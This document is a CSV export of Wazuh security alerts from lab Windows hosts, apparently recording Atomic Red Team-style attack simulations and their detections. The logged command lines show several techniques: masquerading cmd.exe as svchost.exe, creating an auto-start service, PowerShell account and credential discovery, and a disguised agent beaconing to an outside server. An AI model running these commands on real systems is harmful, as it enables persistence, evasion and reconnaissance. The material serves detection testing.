wazuh-alerts-4.x-2024.11.30,n_opfJMBRlc-D5DFWR8E,1,1,192.168.117.130,wazuh-agent,002,Maryam, ,1014, ,0x4000000010000000,{1C95126E-7EEA-49A9-A3FE-A378B03DDB4D},3,System,0,"""Name resolution for the name wpad timed out after none of the configured DNS servers responded.""",0,2024-11-30T08:21:34.163458400Z,1800,1756,DESKTOP-FMI6MML,1014,1452,WARNING,Microsoft-Windows-DNS-Client,6,false,5,Name resolution for the name wpad timed out,"[""windows"",""windows_system""]",61109, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:21:35.589",EventChannel,1732954895.2462734,"Nov 30, 2024 @ 08:21:35.589", , , , , , , , , , , , , , , , , , , , , , , , , , ,128,02000000C0A87502000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000,wpad, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,sfovfJMBRlc-D5DFhx8f,1,1,192.168.117.134,window-agent3,003,Maryam, ,8224, ,0x80000000000000, ,4,Application, ,"""The VSS service is shutting down due to idle timeout. """, ,2024-11-30T08:28:20.337848700Z,2150, ,DESKTOP-QGB4EQH,0, ,INFORMATION,VSS,3,false,5,The VSS service is shutting down due to idle timeout.,"[""windows"",""windows_application""]",60702, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:28:20.399",EventChannel,1732955300.2525940,"Nov 30, 2024 @ 08:28:20.399", , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,2D20436F64653A2020434F525356434330303030303735392D2043616C6C3A2020434F525356434330303030303734312D205049443A202030303030333738382D205449443A202030303030333837362D20434D443A2020433A5C57696E646F77735C73797374656D33325C76737376632E6578652020202D20557365723A204E616D653A204E5420415554484F524954595C53595354454D2C205349443A532D312D352D313820, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,8vpGfJMBRlc-D5DFpR9t,1,1,192.168.117.134,window-agent3,003,Maryam, ,11, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""File created:
RuleName: technique_id=T1059.001,technique_name=PowerShell
UtcTime: 2024-11-30 08:53:34.001
ProcessGuid: {15959494-D28D-674A-4707-000000000D00}
ProcessId: 6516
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\mari\AppData\Local\Temp\__PSScriptPolicyTest_jmbzsnbn.ukd.ps1
CreationUtcTime: 2024-11-30 08:53:34.001
User: DESKTOP-QGB4EQH\mari""",2,2024-11-30T08:53:34.005210200Z,56985,1760,DESKTOP-QGB4EQH,11,2356,INFORMATION,Microsoft-Windows-Sysmon,17,true,15,Executable file dropped in folder commonly used by malware,"[""sysmon"",""sysmon_eid11_detections"",""windows""]",92213, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:53:35.132",EventChannel,1732956815.2787408,"Nov 30, 2024 @ 08:53:35.132", , , , , , , , , , , , ,6516, , , , , , , , , , ,"[""Ingress Tool Transfer""]","[""T1105""]","[""Command and Control""]", , , , ,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe, , , , , , ,{15959494-D28D-674A-4707-000000000D00},2024-11-30 08:53:34.001, ,"technique_id=T1059.001,technique_name=PowerShell", , ,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , ,C:\\Users\\mari\\AppData\\Local\\Temp\\__PSScriptPolicyTest_jmbzsnbn.ukd.ps1,2024-11-30 08:53:34.001, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,9PpGfJMBRlc-D5DFpR9t,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 08:53:34.104
ProcessGuid: {15959494-D28E-674A-4807-000000000D00}
ProcessId: 6620
Image: C:\Users\mari\AppData\Local\Temp\svchost.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\Users\mari\AppData\Local\Temp\svchost.exe"" 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D28D-674A-4707-000000000D00}
ParentProcessId: 6516
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""copy \""$env:ComSpec\"" ($env:TEMP + \""\svchost.exe\""); $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \""\svchost.exe\"")).Id; Stop-Process -ID $myT1036_003""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:53:34.106410800Z,56992,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,true,12,Sysmon - Suspicious Process - svchost.exe,"[""windows"",""sysmon"",""sysmon_process-anomalies""]",61618,"[""IV_35.7.d""]", ,windows_eventchannel,log,"Nov 30, 2024 @ 08:53:35.224",EventChannel,1732956815.2793097,"Nov 30, 2024 @ 08:53:35.224", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,6620, , , , , , ,"[""164.312.b""]","[""10.6.1"",""11.4""]","[""CC7.2"",""CC7.3"",""CC6.1"",""CC6.8""]","[""AU.6"",""SI.4""]","[""Process Injection""]","[""T1055""]","[""Defense Evasion"",""Privilege Escalation""]", , , ,Cmd.Exe,C:\\Users\\mari\\AppData\\Local\\Temp\\svchost.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-D28E-674A-4807-000000000D00},2024-11-30 08:53:34.104,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , ,"{""win"":{""system"":{""providerName"":""Microsoft-Windows-Sysmon"",""providerGuid"":""{5770385F-C22A-43E0-BF4C-06F5698FFBD9}"",""eventID"":""1"",""version"":""5"",""level"":""4"",""task"":""1"",""opcode"":""0"",""keywords"":""0x8000000000000000"",""systemTime"":""2024-11-30T08:53:34.106410800Z"",""eventRecordID"":""56992"",""processID"":""2356"",""threadID"":""1760"",""channel"":""Microsoft-Windows-Sysmon/Operational"",""computer"":""DESKTOP-QGB4EQH"",""severityValue"":""INFORMATION"",""message"":""\""Process Create:\r\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\r\nUtcTime: 2024-11-30 08:53:34.104\r\nProcessGuid: {15959494-D28E-674A-4807-000000000D00}\r\nProcessId: 6620\r\nImage: C:\\Users\\mari\\AppData\\Local\\Temp\\svchost.exe\r\nFileVersion: 10.0.17134.1 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \""C:\\Users\\mari\\AppData\\Local\\Temp\\svchost.exe\"" \r\nCurrentDirectory: C:\\Windows\\system32\\\r\nUser: DESKTOP-QGB4EQH\\mari\r\nLogonGuid: {15959494-D46B-6749-6B7A-100000000000}\r\nLogonId: 0x107A6B\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE\r\nParentProcessGuid: {15959494-D28D-674A-4707-000000000D00}\r\nParentProcessId: 6516\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C \""copy \\\""$env:ComSpec\\\"" ($env:TEMP + \\\""\\svchost.exe\\\""); $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \\\""\\svchost.exe\\\"")).Id; Stop-Process -ID $myT1036_003\""\r\nParentUser: DESKTOP-QGB4EQH\\mari\""""},""eventdata"":{""ruleName"":""technique_id=T1059.003,technique_name=Windows Command Shell"",""utcTime"":""2024-11-30 08:53:34.104"",""processGuid"":""{15959494-D28E-674A-4807-000000000D00}"",""processId"":""6620"",""image"":""C:\\\\Users\\\\mari\\\\AppData\\\\Local\\\\Temp\\\\svchost.exe"",""fileVersion"":""10.0.17134.1 (WinBuild.160101.0800)"",""description"":""Windows Command Processor"",""product"":""Microsoft® Windows® Operating System"",""company"":""Microsoft Corporation"",""originalFileName"":""Cmd.Exe"",""commandLine"":""\\\""C:\\\\Users\\\\mari\\\\AppData\\\\Local\\\\Temp\\\\svchost.exe\\\"""",""currentDirectory"":""C:\\\\Windows\\\\system32\\\\"",""user"":""DESKTOP-QGB4EQH\\\\mari"",""logonGuid"":""{15959494-D46B-6749-6B7A-100000000000}"",""logonId"":""0x107a6b"",""terminalSessionId"":""1"",""integrityLevel"":""High"",""hashes"":""SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE"",""parentProcessGuid"":""{15959494-D28D-674A-4707-000000000D00}"",""parentProcessId"":""6516"",""parentImage"":""C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe"",""parentCommandLine"":""powershell.exe -ExecutionPolicy Bypass -C \\\""copy \\\\\\\""$env:ComSpec\\\\\\\"" ($env:TEMP + \\\\\\\""\\\\svchost.exe\\\\\\\""); $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \\\\\\\""\\\\svchost.exe\\\\\\\"")).Id; Stop-Process -ID $myT1036_003\\\"""",""parentUser"":""DESKTOP-QGB4EQH\\\\mari""}}}", , , , ,{15959494-D28D-674A-4707-000000000D00},"powershell.exe -ExecutionPolicy Bypass -C \""copy \\\""$env:ComSpec\\\"" ($env:TEMP + \\\""\\svchost.exe\\\""); $myT1036_003 = (Start-Process -PassThru -FilePath ($env:TEMP + \\\""\\svchost.exe\\\"")).Id; Stop-Process -ID $myT1036_003\""",0x107a6b,6516,C:\\Windows\\system32\\,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""C:\\Users\\mari\\AppData\\Local\\Temp\\svchost.exe\""",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,FvpQfJMBRlc-D5DFcSBh,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1059.003,technique_name=Windows Command Shell
UtcTime: 2024-11-30 09:04:22.931
ProcessGuid: {15959494-D516-674A-6707-000000000D00}
ProcessId: 6748
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: cmd.exe /C sc.exe create AtomicTestService_CMD binPath= ""411da5_AtomicService.exe"" start=auto  type=Own && sc.exe start AtomicTestService_CMD
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE
ParentProcessGuid: {15959494-D565-6749-1C01-000000000D00}
ParentProcessId: 7968
ParentImage: C:\Users\Public\splunkd.exe
ParentCommandLine: ""C:\Users\Public\splunkd.exe"" -server http://172.31.234.82:8888 -group red 
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T09:04:22.933796100Z,57188,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,21,false,4,Windows command prompt started by an abnormal process,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92052, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:04:24.008",EventChannel,1732957464.2933708,"Nov 30, 2024 @ 09:04:24.008", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,6748, , , , , , , , , , ,"[""Windows Command Shell""]","[""T1059.003""]","[""Execution""]", , , ,Cmd.Exe,C:\\Windows\\System32\\cmd.exe,Microsoft® Windows® Operating System, , ,Windows Command Processor, , ,{15959494-D516-674A-6707-000000000D00},2024-11-30 09:04:22.931,"SHA1=3CE71813199ABAE99348F61F0CAA34E2574F831C,MD5=4E2ACF4F8A396486AB4268C94A6A245F,SHA256=9A7C58BD98D70631AA1473F7B57B426DB367D72429A5455B433A05EE251F3236,IMPHASH=8542FB14699D84D7E8DA92F66145C7FE","technique_id=T1059.003,technique_name=Windows Command Shell",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D565-6749-1C01-000000000D00},"\""C:\\Users\\Public\\splunkd.exe\"" -server http://172.31.234.82:8888 -group red",0x107a6b,7968,C:\\Windows\\system32\\,C:\\Users\\Public\\splunkd.exe,"cmd.exe /C sc.exe create AtomicTestService_CMD binPath= \""411da5_AtomicService.exe\"" start=auto  type=Own &amp;&amp; sc.exe start AtomicTestService_CMD",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,F_pQfJMBRlc-D5DFcSBh,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1543.003,technique_name=Windows Service
UtcTime: 2024-11-30 09:04:22.938
ProcessGuid: {15959494-D516-674A-6807-000000000D00}
ProcessId: 5964
Image: C:\Windows\System32\sc.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Service Control Manager Configuration Tool
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: sc.exe
CommandLine: sc.exe  create AtomicTestService_CMD binPath= ""411da5_AtomicService.exe"" start=auto  type=Own 
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=72785E3068AA52CA223DA466595D3863AB6507AB,MD5=D79784553A9410D15E04766AAAB77CD6,SHA256=AEB241959F4A7B7C29F45D27FD65C5326F9592D25BADD1A7659DE0DA351BF96E,IMPHASH=7D296975925315BE8D57D0C67B133359
ParentProcessGuid: {15959494-D516-674A-6707-000000000D00}
ParentProcessId: 6748
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: cmd.exe /C sc.exe create AtomicTestService_CMD binPath= ""411da5_AtomicService.exe"" start=auto  type=Own && sc.exe start AtomicTestService_CMD
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T09:04:22.939064300Z,57190,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,11,false,3,Suspicious Windows cmd shell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92032, , ,windows_eventchannel,log,"Nov 30, 2024 @ 09:04:24.024",EventChannel,1732957464.2940277,"Nov 30, 2024 @ 09:04:24.024", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,5964, , , , , , , , , , ,"[""Account Discovery"",""Windows Command Shell""]","[""T1087"",""T1059.003""]","[""Discovery"",""Execution""]", , , ,sc.exe,C:\\Windows\\System32\\sc.exe,Microsoft® Windows® Operating System, , ,Service Control Manager Configuration Tool, , ,{15959494-D516-674A-6807-000000000D00},2024-11-30 09:04:22.938,"SHA1=72785E3068AA52CA223DA466595D3863AB6507AB,MD5=D79784553A9410D15E04766AAAB77CD6,SHA256=AEB241959F4A7B7C29F45D27FD65C5326F9592D25BADD1A7659DE0DA351BF96E,IMPHASH=7D296975925315BE8D57D0C67B133359","technique_id=T1543.003,technique_name=Windows Service",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D516-674A-6707-000000000D00},"cmd.exe /C sc.exe create AtomicTestService_CMD binPath= \""411da5_AtomicService.exe\"" start=auto  type=Own &amp;&amp; sc.exe start AtomicTestService_CMD",0x107a6b,6748,C:\\Windows\\system32\\,C:\\Windows\\System32\\cmd.exe,"sc.exe  create AtomicTestService_CMD binPath= \""411da5_AtomicService.exe\"" start=auto  type=Own",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,9_pHfJMBRlc-D5DFLh8m,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 08:54:14.059
ProcessGuid: {15959494-D2B6-674A-4C07-000000000D00}
ProcessId: 5408
Image: C:\Windows\System32\net1.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net1.exe
CommandLine: C:\Windows\system32\net1 user
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=DC6E267A6BF85702F2DD52CB55F0967E2DB7E80D,MD5=AF569DE92AB6C1B9C681AF1E799F9983,SHA256=FFC30745BE3B6C2771FC4B2993CFF50B5226B271C412467E97B1DC1086DEA888,IMPHASH=5322AC1A3CFF9C8A2AE16A789E26231E
ParentProcessGuid: {15959494-D2B6-674A-4B07-000000000D00}
ParentProcessId: 1612
ParentImage: C:\Windows\System32\net.exe
ParentCommandLine: ""C:\Windows\system32\net.exe"" user
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:54:14.060789400Z,57016,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,1,false,3,Discovery activity executed,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92031, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:54:15.207",EventChannel,1732956855.2809996,"Nov 30, 2024 @ 08:54:15.207", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,5408, , , , , , , , , , ,"[""Account Discovery""]","[""T1087""]","[""Discovery""]", , , ,net1.exe,C:\\Windows\\System32\\net1.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-D2B6-674A-4C07-000000000D00},2024-11-30 08:54:14.059,"SHA1=DC6E267A6BF85702F2DD52CB55F0967E2DB7E80D,MD5=AF569DE92AB6C1B9C681AF1E799F9983,SHA256=FFC30745BE3B6C2771FC4B2993CFF50B5226B271C412467E97B1DC1086DEA888,IMPHASH=5322AC1A3CFF9C8A2AE16A789E26231E","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D2B6-674A-4B07-000000000D00},"\""C:\\Windows\\system32\\net.exe\"" user",0x107a6b,1612,C:\\Windows\\system32\\,C:\\Windows\\System32\\net.exe,C:\\Windows\\system32\\net1 user,High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
wazuh-alerts-4.x-2024.11.30,'-PpHfJMBRlc-D5DFLh8m,1,1,192.168.117.134,window-agent3,003,Maryam, ,1, ,0x8000000000000000,{5770385F-C22A-43E0-BF4C-06F5698FFBD9},4,Microsoft-Windows-Sysmon/Operational,0,"""Process Create:
RuleName: technique_id=T1018,technique_name=Remote System Discovery
UtcTime: 2024-11-30 08:54:14.226
ProcessGuid: {15959494-D2B6-674A-4E07-000000000D00}
ProcessId: 5020
Image: C:\Windows\System32\net.exe
FileVersion: 10.0.17134.1 (WinBuild.160101.0800)
Description: Net Command
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: net.exe
CommandLine: ""C:\Windows\system32\net.exe"" localgroup
CurrentDirectory: C:\Windows\system32\
User: DESKTOP-QGB4EQH\mari
LogonGuid: {15959494-D46B-6749-6B7A-100000000000}
LogonId: 0x107A6B
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=A22C23BE5AF113757D68691B10854375F0CE0EFB,MD5=15534275EDAABC58159DD0F8607A71E5,SHA256=E9739D544EE0D428696036CBD656C41DCC505B67CC43DBA7C6BEC4E3959282AC,IMPHASH=EB2C2924EA23E1A5FB0E3F53F46CB709
ParentProcessGuid: {15959494-D2B5-674A-4A07-000000000D00}
ParentProcessId: 3400
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C ""net user; get-localuser; get-localgroupmember -group Users; cmdkey.exe /list; ls C:/Users; get-childitem C:\Users\; dir C:\Users\; get-localgroup; net localgroup""
ParentUser: DESKTOP-QGB4EQH\mari""",5,2024-11-30T08:54:14.227551700Z,57019,1760,DESKTOP-QGB4EQH,1,2356,INFORMATION,Microsoft-Windows-Sysmon,2,false,3,Discovery activity spawned via powershell execution,"[""sysmon"",""sysmon_eid1_detections"",""windows""]",92033, , ,windows_eventchannel,log,"Nov 30, 2024 @ 08:54:15.269",EventChannel,1732956855.2815862,"Nov 30, 2024 @ 08:54:15.269", , , , , , , ,{15959494-D46B-6749-6B7A-100000000000}, , , , ,5020, , , , , , , , , , ,"[""Account Discovery"",""PowerShell""]","[""T1087"",""T1059.001""]","[""Discovery"",""Execution""]", , , ,net.exe,C:\\Windows\\System32\\net.exe,Microsoft® Windows® Operating System, , ,Net Command, , ,{15959494-D2B6-674A-4E07-000000000D00},2024-11-30 08:54:14.226,"SHA1=A22C23BE5AF113757D68691B10854375F0CE0EFB,MD5=15534275EDAABC58159DD0F8607A71E5,SHA256=E9739D544EE0D428696036CBD656C41DCC505B67CC43DBA7C6BEC4E3959282AC,IMPHASH=EB2C2924EA23E1A5FB0E3F53F46CB709","technique_id=T1018,technique_name=Remote System Discovery",Microsoft Corporation,10.0.17134.1 (WinBuild.160101.0800),DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , ,{15959494-D2B5-674A-4A07-000000000D00},"powershell.exe -ExecutionPolicy Bypass -C \""net user; get-localuser; get-localgroupmember -group Users; cmdkey.exe /list; ls C:/Users; get-childitem C:\\Users\\; dir C:\\Users\\; get-localgroup; net localgroup\""",0x107a6b,3400,C:\\Windows\\system32\\,C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe,"\""C:\\Windows\\system32\\net.exe\"" localgroup",High,1,DESKTOP-QGB4EQH\\mari, , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , , 
